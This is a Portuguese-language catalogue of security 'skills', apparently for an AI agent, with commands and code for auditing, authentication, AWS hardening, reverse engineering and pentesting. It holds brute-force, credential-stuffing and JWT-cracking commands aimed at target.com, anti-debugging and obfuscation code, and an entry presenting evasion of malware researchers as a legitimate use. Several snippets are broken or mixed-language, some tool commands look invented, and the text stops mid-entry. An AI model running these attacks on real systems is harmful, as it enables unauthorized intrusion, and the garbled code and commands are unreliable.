# Documentação Completa de Skills de Segurança - Versão Aprimorada

**Data de Geração:** 14/09/2026  
**Total de Skills Documentadas:** 88  
**Categorias:** 3  
**Versão:** 2.0 - Com exemplos avançados, integrações e padrões

---

## Índice

1. [Security Category (80 skills)](#security-category)
2. [Pentest Tools Category (1 skill)](#pentest-tools-category)
3. [Document Verification Category (7 skills)](#document-verification-category)

---

## Security Category

### 1. 007
**Descrição:** Auditoria de segurança, hardening, modelagem de ameaças (STRIDE/PASTA), Red/Blue Team, verificações OWASP, revisão de código, resposta a incidentes e segurança de infraestrutura.

**Quando usar:**
- Auditoria completa de segurança antes de lançamento em produção
- Implementação de programa de segurança corporativo
- Resposta a incidentes e recuperação de ambientes comprometidos
- Conformidade com frameworks como NIST, ISO 27001

**Exemplos práticos:**
```bash
# Exemplo 1: Auditoria OWASP Top 10
owasp-zap -quickurl https://example.com -quickout report.html

# Exemplo 2: Modelagem de ameaças STRIDE
# Criar matrix de ameaças para sistema de pagamento
# Identificar: Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege

# Exemplo 3: Configuração de monitoring para detecção de ameaças
# Implementar SIEM com regras de correlação para ATAques
```

**Casos de uso avançados:**
- **Transformação DevSecOps:** Integrar segurança em pipelines CI/CD existentes
- **Programa de Bug Bounty:** Estruturar programa interno de descoberta de vulnerabilidades
- **Compliance Automatizado:** Implementar verificações contínuas de conformidade

**Integração com outras skills:**
- `threat-modeling-expert`: Para modelagem de ameaças detalhada antes da auditoria
- `security-auditor`: Para auditorias específicas de compliance
- `pentest-checklist`: Para planejamento sistemático de testes

**Padrões e anti-padrões:**
✅ Fazer: Realizar auditorias periódicas, documentar todos os achados, criar planos de remediação
❌ Evitar: Auditar apenas uma vez, ignorar vulnerabilidades de baixo risco, não validar correções

**Dicas de performance:**
- Use automação para verificações repetitivas
- Priorize vulnerabilidades por CVSS score e impacto de negócio
- Mantenha registros históricos para análise de tendências

**Comandos úteis:**
```bash
# Scanner de vulnerabilidades
nmap -sV -sC -O target.com

# Análise de configurações inseguras
lynis audit system

# Verificação de compliance
aws configservice get-compliance-details-by-config-rule
```

**Referências:**
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [MITRE ATT&CK](https://attack.mitre.org/)

---

### 2. anti-reversing-techniques
**Descrição:** Técnicas de segurança de uso duplo para ofuscação de código e prevenção de engenharia reversa. **APENAS PARA USO AUTORIZADO.**

**Quando usar:**
- Proteger propriedade intelectual em software comercial
- Proteger algoritmos proprietários em aplicativos móveis
- Prevenir análise de malware por pesquisadores

**Exemplos práticos:**
```c
// Exemplo 1: Ofuscação de strings em C
char encoded[] = {0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x00};
for(int i=0; i<sizeof(encoded)-1; i++) {
    encoded[i] ^= 0x55; // XOR com chave
}

// Exemplo 2: Anti-debugging em Python
import sys
if sys.gettrace() is not None:
    sys.exit(1) # Sai se estiver sendo debugado

// Exemplo 3: Ofuscação de código JavaScript
eval(atob('ZG9jdW1lbnQud3JpdGUoIkhlbGxvIik7'));
```

**Casos de uso avançados:**
- **Proteção de jogos online:** Prevenir trapaças e cheat engines
- **Software bancário:** Proteger algoritmos de autenticação
- **DRM de mídia:** Prevenir cópia não autorizada

**Integração com outras skills:**
- `binary-analysis-patterns`: Para entender técnicas de engenharia reversa que quer evitar
- `reverse-engineer`: Para testar eficácia das proteções implementadas
- `solidity-security`: Para proteger smart contracts contra análise

**Padrões e anti-padrões:**
✅ Fazer: Usar múltiplas camadas de proteção, testar resistência a engenharia reversa
❌ Evitar: Confiar em apenas uma técnica, usar métodos que degradem performance significativamente

**Dicas de performance:**
- Use ofuscação seletiva em partes críticas do código
- Equilibre segurança com performance
- Teste em diferentes plataformas e dispositivos

**Comandos úteis:**
```bash
# Ofuscação de código Python
pip install pyobfuscus
pyobfuscus script.py

# Análise de ofuscação
strings binary | grep -i suspicious

# Detecção de anti-debug
ltrace ./binary
```

**Referências:**
- [OWASP Anti-Reverse Engineering](https://owasp.org/www-project-code-review-guide/)
- [Anti-Debugging Techniques](https://www.apriorit.com/dev-blog/367-anti-debugging-techniques)
- [Obfuscation Tools](https://github.com/Atonalogy/awesome-obfuscation)

---

### 3. attack-tree-construction
**Descrição:** Construir árvores de ataque abrangentes para visualizar caminhos de ameaças.

**Quando usar:**
- Planejamento de segurança em fase de design
- Análise de custo-benefício de controles de segurança
- Comunicação de riscos para stakeholders não-técnicos

**Exemplos práticos:**
```markdown
# Exemplo 1: Árvore de ataque para e-commerce
Root: Roubar dados de pagamento
├── A1: Comprometer servidor web
│   ├── A1.1: SQL Injection
│   ├── A1.2: XSS Armazenado
│   └── A1.3: RCE via upload
├── A2: Phishing de funcionários
│   ├── A2.1: Spear phishing
│   └── A2.2: Watering hole
└── A3: Ataque à cadeia de suprimentos
    ├── A3.1: Comprometer dependência
    └── A3.2: Injeção em pipeline CI/CD

# Exemplo 2: Ferramenta para visualização
# Usar Mermaid ou Graphviz para gerar diagramas
```

**Casos de uso avançados:**
- **Análise de risco quantitativo:** Calcular probabilidade e impacto de cada caminho
- **Otimização de investimento em segurança:** Identificar controles mais eficazes
- **Planejamento de resposta a incidentes:** Mapear vetores de ataque mais prováveis

**Integração com outras skills:**
- `stride-analysis-patterns`: Para identificar categorias de ameaças
- `threat-mitigation-mapping`: Para mapear contramedidas para cada nó da árvore
- `security-requirement-extraction`: Para derivar requisitos da árvore

**Padrões e anti-padrões:**
✅ Fazer: Incluir cenários de ataque reais, atualizar árvores periodicamente
❌ Evitar: Criar árvores muito genéricas, ignorar vetores de ataque internos

**Dicas de performance:**
- Use ferramentas de visualização para árvores complexas
- Foque nos 20% dos caminhos que representam 80% do risco
- Valide com equipe de segurança e operações

**Comandos úteis:**
```bash
# Gerar diagrama com Graphviz
dot -Tpng attack_tree.dot -o attack_tree.png

# Ferramenta de modelagem
# Usar Microsoft Threat Modeling Tool ou OWASP Threat Dragon
```

**Referências:**
- [Attack Trees - Bruce Schneier](https://www.schneier.com/academic/archives/1999/12/attack_trees.html)
- [OWASP Threat Modeling](https://owasp.org/www-community/Threat_Modeling)
- [STRIDE per Element](https://docs.microsoft.com/en-us/previous-versions/commerce-server/ee823609(v=technet.10))

---

### 4. audit-skills
**Descrição:** Auditor de segurança especialista para Skills e Bundles de IA. Realiza análise estática não intrusiva para identificar padrões maliciosos, vazamentos de dados e payloads ofuscados.

**Quando usar:**
- Antes de instalar qualquer skill ou extensão de IA
- Auditoria periódica de skills já instaladas
- Verificação de skills desenvolvidas internamente

**Exemplos práticos:**
```python
# Exemplo 1: Análise estática de skill
# Verificar padrões suspeitos em arquivos de skill
import re

def analyze_skill(skill_path):
    with open(skill_path, 'r') as f:
        content = f.read()
    
    patterns = [
        r'eval\(',
        r'exec\(',
        r'import os',
        r'subprocess',
        r'base64',
        r'\\x[0-9a-f]{2}'
    ]
    
    for pattern in patterns:
        if re.search(pattern, content):
            print(f"Padrão suspeito encontrado: {pattern}")

# Exemplo 2: Verificar permissões
import os
skill_dir = '/path/to/skill'
for root, dirs, files in os.walk(skill_dir):
    for file in files:
        filepath = os.path.join(root, file)
        if os.access(filepath, os.W_OK):
            print(f"Arquivo gravável: {filepath}")

# Exemplo 3: Verificar conexões de rede
# Analisar se skill faz conexões externas não autorizadas
```

**Casos de uso avançados:**
- **Auditoria automatizada em pipeline:** Integrar em CI/CD para verificar skills antes de deploy
- **Análise de comportamento:** Monitorar skills em sandbox para detectar atividades suspeitas
- **Conformidade regulatória:** Verificar se skills atendem a requisitos de compliance

**Integração com outras skills:**
- `skill-audit`: Para auditoria completa de skills
- `skill-security-audit`: Para verificações específicas de segurança
- `audit-skills`: Para análise de padrões maliciosos

**Padrões e anti-padrões:**
✅ Fazer: Auditar skills regularmente, usar sandbox para testes, manter registro de auditorias
❌ Evitar: Instalar skills de fontes não confiáveis, ignorar permissões excessivas

**Dicas de performance:**
- Automatize verificações comuns em scripts
- Use listas de verificação padronizadas
- Integre com ferramentas de CI/CD existentes

**Comandos úteis:**
```bash
# Verificar hashes de integridade
sha256sum skill_file.js

# Analisar dependências
npm audit --audit-level=high

# Verificar conectividade
netstat -an | grep ESTABLISHED
```

**Referências:**
- [OWASP AI Security Guide](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- [NIST AI Risk Management Framework](https://www.nist.gov/artificial-intelligence/risk-management-framework)
- [MITRE ATLAS](https://atlas.mitre.org/)

---

### 5. auth-implementation-patterns
**Descrição:** Implementar ou revisar autenticação e autorização com limites explícitos de token, sessão e acesso a recursos.

**Quando usar:**
- Implementação de OAuth 2.0, OpenID Connect, SAML
- Revisão de sistemas de autenticação existentes
- Migração de autenticação legada para padrões modernos

**Exemplos práticos:**
```javascript
// Exemplo 1: Implementação JWT segura
const jwt = require('jsonwebtoken');

// Gerar token com expiração curta
const token = jwt.sign(
  { userId: user.id, role: user.role },
  process.env.JWT_SECRET,
  { expiresIn: '15m' } // Token de acesso curto
);

// Refresh token com expiração longa
const refreshToken = jwt.sign(
  { userId: user.id, tokenVersion: user.tokenVersion },
  process.env.JWT_REFRESH_SECRET,
  { expiresIn: '7d' }
);

// Exemplo 2: Validação de sessão
app.use((req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Token required' });
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Invalid token' });
  }
});

// Exemplo 3: Rate limiting para prevenir brute force
const rateLimit = require('express-rate-limit');
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 5, // 5 tentativas por IP
  message: 'Muitas tentativas de login'
});
```

**Casos de uso avançados:**
- **Autenticação sem senha:** Implementar WebAuthn/FIDO2
- **Zero Trust Architecture:** Autenticação contínua e verificação de contexto
- **SSO Corporativo:** Integração com Active Directory, Okta, Auth0

**Integração com outras skills:**
- `broken-authentication`: Para identificar vulnerabilidades em implementações existentes
- `mtls-configuration`: Para autenticação mútua entre serviços
- `secrets-management`: Para gerenciar chaves de assinatura

**Padrões e anti-padrões:**
✅ Fazer: Usar tokens de curta duração, implementar rotação de chaves, validar todos os claims
❌ Evitar: Armazenar senhas em texto plano, usar JWT sem verificação, ignorar validação de input

**Dicas de performance:**
- Use cache para tokens validados
- Implemente refresh tokens para reduzir chamadas de autenticação
- Considere usar provedores de identidade gerenciados

**Comandos úteis:**
```bash
# Gerar chave RSA para JWT
openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048

# Decodificar JWT (para debug)
echo "eyJhbGciOiJIUzI1NiJ9..." | base64 -d

# Testar endpoints protegidos
curl -H "Authorization: Bearer <token>" https://api.example.com/protected
```

**Referências:**
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [JWT Best Practices](https://datatracker.ietf.org/doc/html/rfc8725)
- [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)

---

### 6. aws-compliance-checker
**Descrição:** Verificação automatizada de conformidade com benchmarks CIS, PCI-DSS, HIPAA e SOC 2.

**Quando usar:**
- Auditorias de conformidade periódicas
- Preparação para certificações (PCI, SOC2, ISO 27001)
- Controles contínuos de conformidade

**Exemplos práticos:**
```bash
# Exemplo 1: Verificar conformidade CIS AWS
aws configservice get-compliance-by-config-rule

# Exemplo 2: Verificar PCI-DSS
# Habilitar AWS Config conformance packs
aws configservice put-conformance-pack \
  --conformance-pack-name PCI-DSS-3.2.1 \
  --template-s3-uri s3://aws-configconforms/packs/PCI_DSS_3_2_1.yaml

# Exemplo 3: Verificar HIPAA
aws configservice get-compliance-details-by-config-rule \
  --config-rule-name "encrypted-volumes"

# Exemplo 4: Relatório de conformidade
aws configservice get-compliance-summary-by-config-rule
```

**Casos de uso avançados:**
- **Compliance como Código:** Definir regras de conformidade em Terraform/CloudFormation
- **Remediação Automatizada:** Configurar auto-remediation para violações comuns
- **Relatórios Executivos:** Gerar dashboards de conformidade para gestão

**Integração com outras skills:**
- `aws-iam-best-practices`: Para verificar conformidade de políticas IAM
- `aws-security-audit`: Para auditoria abrangente de segurança
- `security-compliance-compliance-check`: Para conformidade multi-nuvem

**Padrões e anti-padrões:**
✅ Fazer: Automatizar verificações, manter records de conformidade, testar remediações
❌ Evitar: Confiar em verificações manuais, ignorar mudanças de configuração, não atualizar benchmarks

**Dicas de performance:**
- Use AWS Config para monitoramento contínuo
- Implemente alertas para violações críticas
- Agregue dados em dashboards centralizados

**Comandos úteis:**
```bash
# Habilitar AWS Config
aws configservice start-configuration-recorder --configuration-recorder-name default

# Verificar status de conformidade
aws configservice describe-compliance-by-config-rule

# Exportar relatório
aws configservice get-compliance-summary-by-account
```

**Referências:**
- [AWS Compliance Programs](https://aws.amazon.com/compliance/programs/)
- [CIS AWS Foundations Benchmark](https://www.cisecurity.org/benchmark/aws)
- [AWS Config Documentation](https://docs.aws.amazon.com/config/)

---

### 7. aws-iam-best-practices
**Descrição:** Revisão, hardening e implementação do menor privilégio em políticas IAM.

**Quando usar:**
- Revisão periódica de permissões IAM
- Implementação de least privilege
- Limpeza de credenciais não utilizadas

**Exemplos práticos:**
```json
// Exemplo 1: Política IAM最小特权
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:PutObject"
      ],
      "Resource": "arn:aws:s3:::my-bucket/*",
      "Condition": {
        "Bool": {
          "aws:SecureTransport": "true"
        }
      }
    }
  ]
}

// Exemplo 2: Verificar permissões não utilizadas
# Usar IAM Access Analyzer
aws iam get-access-preview --access-preview-id <id>

// Exemplo 3: Rotacionar credenciais automaticamente
# Configurar rotação de chaves de acesso
aws iam create-access-key --user-name <user>
```

**Casos de uso avançados:**
- **Access Review Automatizado:** Configurar revisões periódicas de acesso
- **Permissions Boundary:** Limitar permissões máximas para usuários
- **Service Control Policies (SCPs):** Controles em nível de organização

**Integração com outras skills:**
- `secrets-management`: Para gerenciar credenciais AWS
- `aws-compliance-checker`: Para verificar conformidade de políticas
- `aws-security-audit`: Para auditoria completa de segurança

**Padrões e anti-padrões:**
✅ Fazer: Usar políticas gerenciadas quando possível, implementar MFA, revisar regularmente
❌ Evitar: Usar wildcards (*), criar políticas ad-hoc, manter credenciais não utilizadas

**Dicas de performance:**
- Use IAM Access Analyzer para detectar permissões excessivas
- Implemente tags para gerenciar políticas por ambiente
- Use AWS Organizations para gerenciar políticas centralizadamente

**Comandos úteis:**
```bash
# Listar políticas gerenciadas
aws iam list-policies --scope AWS

# Analisar uso de permissiones
aws iam generate-credential-report

# Verificar MFA
aws iam list-mfa-devices --user-name <user>
```

**Referências:**
- [AWS IAM Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)
- [AWS IAM Access Analyzer](https://aws.amazon.com/iam/features/access-analyzer/)
- [Least Privilege Principle](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege)

---

### 8. aws-secrets-rotation
**Descrição:** Automatizar a rotação de segredos AWS para RDS, chaves de API e credenciais.

**Quando usar:**
- Rotação automática de senhas de banco de dados
- Gerenciamento de chaves de API
- Conformidade com políticas de rotação de credenciais

**Exemplos práticos:**
```python
# Exemplo 1: Rotação de segredo com AWS Lambda
import boto3
import json

def lambda_handler(event, context):
    secrets_client = boto3.client('secretsmanager')
    
    # Obter segredo atual
    secret = secrets_client.get_secret_value(SecretId=event['SecretId'])
    
    # Gerar nova senha
    import secrets
    new_password = secrets.token_urlsafe(32)
    
    # Atualizar segredo
    secrets_client.update_secret(
        SecretId=event['SecretId'],
        SecretString=json.dumps({
            'username': 'admin',
            'password': new_password
        })
    )
    
    return {'statusCode': 200, 'body': 'Senha rotacionada'}

# Exemplo 2: Configurar rotação automática
# Criar Lambda para rotação
aws lambda create-function \
  --function-name rotate-secret \
  --runtime python3.9 \
  --handler lambda_function.lambda_handler \
  --role <role-arn> \
  --zip-file fileb://deployment-package.zip

# Exemplo 3: Configurar agendamento
aws events put-rule \
  --name "rotate-secrets-monthly" \
  --schedule-expression "rate(30 days)"
```

**Casos de uso avançados:**
- **Rotação em cascata:** Rotacionar múltiplos segredos relacionados
- **Rotação condicional:** Baseada em eventos ou mudanças de configuração
- **Auditoria de rotação:** Rastrear todas as rotações para compliance

**Integração com outras skills:**
- `secrets-management`: Para gerenciamento abrangente de segredos
- `aws-iam-best-practices`: Para gerenciar permissões de rotação
- `aws-security-audit`: Para verificar conformidade de rotação

**Padrões e anti-padrões:**
✅ Fazer: Automatizar rotações, testar rotações regularmente, manter backups
❌ Evitar: Rotacionar manualmente, ignorar rotações, armazenar segredos em código

**Dicas de performance:**
- Use AWS Secrets Manager para rotação automática
- Implemente validação pós-rotação
- Monitore falhas de rotação com CloudWatch

**Comandos úteis:**
```bash
# Listar segredos
aws secretsmanager list-secrets

# Rotacionar segredo manualmente
aws secretsmanager rotate-secret --secret-id <secret-id>

# Verificar status de rotação
aws secretsmanager describe-secret --secret-id <secret-id>
```

**Referências:**
- [AWS Secrets Manager Rotation](https://docs.aws.amazon.com/secretsmanager/latest/userguide/rotating-secrets.html)
- [Lambda Rotation Functions](https://docs.aws.amazon.com/secretsmanager/latest/userguide/rotating-secrets-lambda-function.html)
- [Secrets Manager Best Practices](https://docs.aws.amazon.com/secretsmanager/latest/userguide/best-practices.html)

---

### 9. aws-security-audit
**Descrição:** Avaliação abrangente da postura de segurança AWS usando AWS CLI e melhores práticas.

**Quando usar:**
- Auditorias periódicas de segurança
- Preparação para certificações
- Verificação de conformidade contínua

**Exemplos práticos:**
```bash
# Exemplo 1: Verificar recursos expostos publicamente
aws ec2 describe-security-groups --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]]'

# Exemplo 2: Verificar S3 buckets públicos
aws s3api list-buckets --query 'Buckets[].Name' --output text | while read bucket; do
  aws s3api get-bucket-acl --bucket $bucket 2>/dev/null
done

# Exemplo 3: Verificar CloudTrail habilitado
aws cloudtrail describe-trails --query 'trailList[].TrailARN'

# Exemplo 4: Verificar VPC Flow Logs
aws ec2 describe-flow-logs --query 'FlowLogs[].FlowLogStatus'
```

**Casos de uso avançados:**
- **Auditoria Automatizada:** Criar scripts de auditoria periódica
- **Baseline de Segurança:** Estabelecer e monitorar estado baseline
- **Resposta a Incidentes:** Coletar evidências rapidamente

**Integração com outras skills:**
- `aws-compliance-checker`: Para verificações específicas de compliance
- `aws-iam-best-practices`: Para auditoria de políticas IAM
- `scanning-tools`: Para varreduras de vulnerabilidades

**Padrões e anti-padrões:**
✅ Fazer: Automatizar auditorias, manter registros históricos, priorizar achados
❌ Evitar: Auditar apenas uma vez, ignorar recursos não monitorados, não validar correções

**Dicas de performance:**
- Use AWS Config para monitoramento contínuo
- Implemente alertas para mudanças críticas
- Use AWS Security Hub para agregação de findings

**Comandos úteis:**
```bash
# Verificar uso de MFA
aws iam generate-credential-report && aws iam get-credential-report --query 'Content' --output text | base64 -d

# Verificar encrypt at rest
aws ec2 describe-volumes --query 'Volumes[?Encrypted==`false`]'

# Verificar access keys antigas
aws iam list-access-keys --user-name <user> --query 'AccessKeyMetadata[].CreateDate'
```

**Referências:**
- [AWS Security Best Practices](https://docs.aws.amazon.com/whitepapers/latest/aws-security-best-practices/welcome.html)
- [AWS Security Hub](https://aws.amazon.com/security-hub/)
- [AWS Well-Architected Framework - Security Pillar](https://docs.aws.amazon.com/wellarchitected/latest/security-pillar/welcome.html)

---

### 10. binary-analysis-patterns
**Descrição:** Padrões e técnicas abrangentes para analisar binários compilados, entender código assembly e reconstruir lógica de programa.

**Quando usar:**
- Análise de malware
- Engenharia reversa de software proprietário
- Auditoria de segurança de binários

**Exemplos práticos:**
```bash
# Exemplo 1: Análise estática com Ghidra
# Abrir binário no Ghidra e usar decompiler

# Exemplo 2: Análise dinâmica com GDB
gdb ./binary
(gdb) disassemble main
(gdb) break *0x401000
(gdb) run

# Exemplo 3: Análise de strings
strings -n 8 binary | grep -i password

# Exemplo 4: Verificar imports/exports
objdump -p binary | grep -i "import\|export"
```

**Casos de uso avançados:**
- **Análise de rootkits:** Identificar código malicioso oculto
- **Engenharia reversa de protocolos:** Entender protocolos proprietários
- **Verificação de software:** Confirmar comportamento declarado

**Integração com outras skills:**
- `malware-analyst`: Para análise específica de malware
- `reverse-engineer`: Para engenharia reversa avançada
- `firmware-analyst`: Para análise de firmware

**Padrões e anti-padrões:**
✅ Fazer: Usar ambiente sandbox, documentar achados, comparar com versionado
❌ Evitar: Analisar binários em ambiente de produção, ignorar anti-análise, pular etapas

**Dicas de performance:**
- Use ferramentas de descompilação para acelerar análise
- Mantenha biblioteca de padrões conhecidos
- Use automação para análise de binários similares

**Comandos úteis:**
```bash
# Verificar arquitetura
file binary

# Analisar seções ELF
readelf -S binary

# Desassemblar
objdump -d binary | head -100
```

**Referências:**
- [Ghidra Documentation](https://ghidra-sre.org/)
- [Reverse Engineering for Beginners](https://beginners.re/)
- [恶意代码分析实战](https://www.malware.computer/)

---

### 11. broken-authentication
**Descrição:** Identificar e explorar vulnerabilidades de autenticação e gerenciamento de sessão em aplicações web.

**Quando usar:**
- Testes de penetração em sistemas de login
- Auditoria de implementações de autenticação
- Identificação de vulnerabilities de sessão

**Exemplos práticos:**
```bash
# Exemplo 1: Teste de brute force
hydra -l admin -P passwords.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"

# Exemplo 2: Teste de session fixation
# Capturar cookie de sessão antes e após login
# Verificar se o ID de sessão muda após autenticação

# Exemplo 3: Teste de credential stuffing
# Usar listas de credenciais comprometidas
python3 credential_stuffer.py -t https://target.com/login -u users.txt -p passwords.txt

# Exemplo 4: Análise de tokens JWT
jwt_tool.py <token> -C -d dictionary.txt
```

**Casos de uso avançados:**
- **Teste de MFA bypass:** Tentar contornar autenticação de dois fatores
- **Análise de políticas de senha:** Verificar se políticas são adequadas
- **Teste de recuperação de conta:** Explorar fluxos de reset de senha

**Integração com outras skills:**
- `auth-implementation-patterns`: Para entender implementação alvo
- `top-web-vulnerabilities`: Para contexto de vulnerabilidades
- `pentest-checklist`: Para planejamento de testes

**Padrões e anti-padrões:**
✅ Fazer: Testar todos os fluxos de autenticação, documentar vulnerabilidades, recomendar correções
❌ Evitar: Testar sem autorização, explotar em produção, ignorar impacto de negócio

**Dicas de performance:**
- Use listas de palavras direcionadas
- Automatize testes repetitivos
- Foque em vetores de ataque de alto impacto

**Comandos úteis:**
```bash
# Enumerar usuários
python3 user_enum.py -t https://target.com

# Testar session management
curl -c cookies.txt -b cookies.txt https://target.com/login

# Analisar tokens
jwt_tool.py <token> -X k -pk public_key.pem
```

**Referências:**
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [Testing for Authentication](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Authentication_Testing/)

---

### 12. bumblebee
**Descrição:** Executar varreduras de inventário e exposição de cadeia de suprimentos Bumblebee em macOS/Linux.

**Quando usar:**
- Detecção de pacotes comprometidos
- Verificação de extensões e configurações
- Análise de superfície de ataque

**Exemplos práticos:**
```bash
# Exemplo 1: Varredura de inventário
bumblebee scan --output report.json

# Exemplo 2: Verificar dependências
bumblebee audit --severity critical,high

# Exemplo 3: Verificar configurações
bumblebee config-check --baseline strict

# Exemplo 4: Relatório de conformidade
bumblebee report --format pdf --controls CIS
```

**Casos de uso avançados:**
- **SCA em CI/CD:** Integrar varreduras em pipelines
- **Monitoramento contínuo:** Varreduras agendadas
- **Resposta a incidentes:** Identificar comprometimento rápido

**Integração com outras skills:**
- `supply-chain-security`: Para análise abrangente de cadeia de suprimentos
- `dependency-management-deps-audit`: Para análise de dependências
- `cyber-audit`: Para auditoria de exposição

**Padrões e anti-padrões:**
✅ Fazer: Automatizar varreduras, manter atualizado, priorizar vulnerabilidades críticas
❌ Evitar: Ignorar alertas de baixo nível, não verificar regularmente, confiar apenas em uma ferramenta

**Dicas de performance:**
- Integre com ferramentas de CI/CD
- Use cache para varreduras incrementais
- Configure alertas para vulnerabilidades críticas

**Comandos úteis:**
```bash
# Instalação
pip install bumblebee-security

# Varredura completa
bumblebee full-scan --target /path/to/project

# Exportar resultados
bumblebee export --format sarif --output results.sarif
```

**Referências:**
- [Bumblebee Security Documentation](https://bumblebee.security/docs)
- [Software Supply Chain Security](https://sigs.sigstore.dev/)
- [NIST SSDF](https://csrc.nist.gov/projects/ssdf)

---

### 13. burp-suite-testing
**Descrição:** Executar testes de segurança abrangentes em aplicações web usando o conjunto integrado de ferramentas Burp Suite.

**Quando usar:**
- Testes de penetração em aplicações web
- Interceptação e manipulação de tráfego HTTP
- Varredura automatizada de vulnerabilidades

**Exemplos práticos:**
```bash
# Exemplo 1: Configurar proxy
# Configurar navegador para usar proxy Burp (127.0.0.1:8080)

# Exemplo 2: Spider/Crawler
# Usar Burp Spider para mapear aplicação

# Exemplo 3: Scanner
# Executar scan em target específico
burp-scanner --target https://example.com --scope "*"

# Exemplo 4: Intruder para brute force
# Configurar ataque com wordlist
```

**Casos de uso avançados:**
- **Teste de APIs REST/GraphQL:** Análise de endpoints de API
- **Teste de autenticação:** Bypass de controles de acesso
- **Análise de compartilhamento de dados:** Identificar vazamentos de informações

**Integração com outras skills:**
- `burpsuite-project-parser`: Para análise de projetos Burp
- `sql-injection-testing`: Para testes específicos de SQLi
- `xss-html-injection`: Para testes de XSS

**Padrões e anti-padrões:**
✅ Fazer: Configurar escopo corretamente, usar autenticação, documentar achados
❌ Evitar: Testar fora de escopo, ignorar falsos positivos, não usar contexto de autenticação

**Dicas de performance:**
- Use Project Files para persistir dados
- Configure scan policies para reduzir tempo
- Use extensions para automação

**Comandos úteis:**
```bash
# Burp Suite Community Edition
java -jar burpsuite_community.jar

# Burp Suite Professional
java -jar burpsuite_pro.jar

# API do Burp
curl -X POST http://127.0.0.1:1337/v0.1/scan -d '{"url":"https://example.com"}'
```

**Referências:**
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [Burp Suite Extensions](https://portswigger.net/burp/communitygallery)

---

### 14. burpsuite-project-parser
**Descrição:** Pesquisar e explorar arquivos de projeto Burp Suite (.burp) via linha de comando.

**Quando usar:**
- Análise forense de tráfego HTTP
- Extração de dados de projetos Burp
- Automação de relatórios

**Exemplos práticos:**
```python
# Exemplo 1: Extrair requests de proxy
import json

def extract_proxy_history(project_file):
    with open(project_file, 'r') as f:
        data = json.load(f)
    
    for item in data['proxy']['history']:
        print(f"{item['request']['method']} {item['request']['url']}")

# Exemplo 2: Analisar scan results
def analyze_scan_results(project_file):
    with open(project_file, 'r') as f:
        data = json.load(f)
    
    issues = data.get('scan', {}).get('issues', [])
    for issue in issues:
        print(f"Issue: {issue['name']} - Severity: {issue['severity']}")

# Exemplo 3: Filtrar por tipo de vulnerability
def filter_vulnerabilities(project_file, vuln_type):
    with open(project_file, 'r') as f:
        data = json.load(f)
    
    return [i for i in data.get('issues', []) if vuln_type.lower() in i['name'].lower()]
```

**Casos de uso avançados:**
- **Geração de relatórios automatizados:** Criar relatórios executivos
- **Análise de tendências:** Identificar padrões de vulnerabilidades
- **Correlação com outras ferramentas:** Integrar com SIEM

**Integração com outras skills:**
- `burp-suite-testing`: Para contexto de testes
- `security-auditor`: Para auditorias abrangentes
- `differential-review`: Para revisão de código

**Padrões e anti-padrões:**
✅ Fazer: Validar dados extraídos, proteger dados sensíveis, automatizar análise
❌ Evitar: Compartilhar projetos Burp, ignorar dados pessoais, não verificar integridade

**Dicas de performance:**
- Use scripts Python para análise automatizada
- Filtre dados irrelevantes antes da análise
- Use banco de dados para dados grandes

**Comandos úteis:**
```bash
# Converter projeto Burp para JSON
python3 burp_parser.py project.burp > project.json

# Filtrar requests por status code
cat project.json | jq '.proxy.history[] | select(.response.status == 200)'

# Extrair URLs únicas
cat project.json | jq -r '.proxy.history[].request.url' | sort -u
```

**Referências:**
- [Burp Suite Project Files](https://portswigger.net/burp/documentation/desktop/projects)
- [Burp Suite REST API](https://portswigger.net/burp/documentation/desktop/rest-api)
- [Burp Suite Extensions Development](https://portswigger.net/burp/documentation/extender)

---

### 15. constant-time-analysis
**Descrição:** Analisar código criptográfico para detectar operações que vazam dados secretos através de variações de tempo de execução.

**Quando usar:**
- Auditoria de implementações criptográficas
- Verificação de conformidade com padrões de segurança
- Prevenção de ataques de canal lateral

**Exemplos práticos:**
```python
# Exemplo 1: Verificar comparção em tempo constante
def constant_time_compare(a, b):
    if len(a) != len(b):
        return False
    result = 0
    for x, y in zip(a, b):
        result |= x ^ y
    return result == 0

# Exemplo 2: Análise de timing
import time

def measure_timing(func, *args):
    times = []
    for _ in range(1000):
        start = time.perf_counter()
        func(*args)
        end = time.perf_counter()
        times.append(end - start)
    return sum(times) / len(times)

# Exemplo 3: Verificar branches condicionais
def secure_compare(input_val, secret):
    # Evitar early return
    result = 0
    for x, y in zip(input_val, secret):
        result |= x ^ y
    return result == 0
```

**Casos de uso avançados:**
- **Auditoria de bibliotecas criptográficas:** Verificar implementações OpenSSL, libsodium
- **Análise de hardware:** Verificar side channels em implementações de hardware
- **Proteção contra timing attacks:** Implementar contramedidas

**Integração com outras skills:**
- `binary-analysis-patterns`: Para análise de binários compilados
- `solidity-security`: Para smart contracts com operações criptográficas
